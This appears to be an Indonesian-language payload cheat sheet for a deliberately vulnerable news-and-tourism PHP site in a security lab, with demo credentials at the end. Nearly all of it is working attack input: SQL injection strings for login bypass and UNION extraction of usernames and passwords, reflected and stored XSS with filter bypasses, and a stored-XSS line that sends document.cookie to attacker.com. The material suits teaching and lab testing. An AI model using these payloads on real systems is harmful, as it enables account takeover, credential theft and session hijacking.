# 🔓 Daftar Payload Injection Testing
# Portal Wisata & Berita Kota - Security Lab

> ⚠️ **Disclaimer:** Gunakan payload ini **hanya untuk keperluan edukasi** di lab environment.

---

## 1. SQL Injection (login.php)

**Lokasi:** Form Login → Field Username/Password

### Basic Bypass
```sql
admin' OR '1'='1
```
```sql
' OR '1'='1' --
```
```sql
' OR 1=1 #
```
```sql
admin'--
```

### UNION-Based
```sql
' UNION SELECT 1,2,3,4,5,6 --
```
```sql
' UNION SELECT null,username,password,null,null,null FROM users --
```

### Time-Based Blind
```sql
admin' AND SLEEP(5) --
```
```sql
' OR SLEEP(5) #
```

### Error-Based
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

**Contoh Penggunaan:**
- Username: `admin' OR '1'='1`
- Password: _(kosong atau apapun)_

---

## 2. Reflected XSS (search.php)

**Lokasi:** URL Parameter `?q=`

### Basic Alert
```html
<script>alert('XSS')</script>
```
```html
<script>alert(document.cookie)</script>
```

### Event-Based
```html
<img src=x onerror="alert('XSS')">
```
```html
<svg onload="alert('XSS')">
```
```html
<body onload="alert('XSS')">
```

### Breaking Attributes
```html
"><script>alert('XSS')</script>
```

### Iframe Injection
```html
<iframe src="javascript:alert('XSS')">
```

### Filter Bypass
```html
<ScRiPt>alert('XSS')</ScRiPt>
```
```html
<script>alert(String.fromCharCode(88,83,83))</script>
```
```html
<img src=x onerror=alert`XSS`>
```

**Contoh URL:**
```
http://localhost/portal-wisata-berita/search.php?q=<script>alert('XSS')</script>
```

---

## 3. Stored XSS (view.php)

**Lokasi:** Form Komentar → Field Komentar

### Basic Stored XSS
```html
<script>alert('Stored XSS')</script>
```

### Cookie Stealing
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Image-Based
```html
<img src=x onerror="alert('XSS')">
```

### SVG-Based
```html
<svg/onload=alert('XSS')>
```

### Other Elements
```html
<marquee onstart=alert('XSS')>
```
```html
<details open ontoggle=alert('XSS')>
```
```html
<b onmouseover="alert('XSS')">Hover Me</b>
```

**Contoh Penggunaan:**
- Nama: `Tester`
- Email: `test@test.com`
- Komentar: `<script>alert('Stored XSS')</script>`

---

## 4. Quick Reference

| Vulnerability | File | Field | Basic Payload |
|--------------|------|-------|---------------|
| SQL Injection | login.php | username | `admin' OR '1'='1` |
| Reflected XSS | search.php | q (URL) | `<script>alert('XSS')</script>` |
| Stored XSS | view.php | comment | `<script>alert('XSS')</script>` |

---

## 5. Demo Credentials

| Role | Username | Password |
|------|----------|----------|
| Admin | admin | admin123 |
| Editor | editor | editor123 |
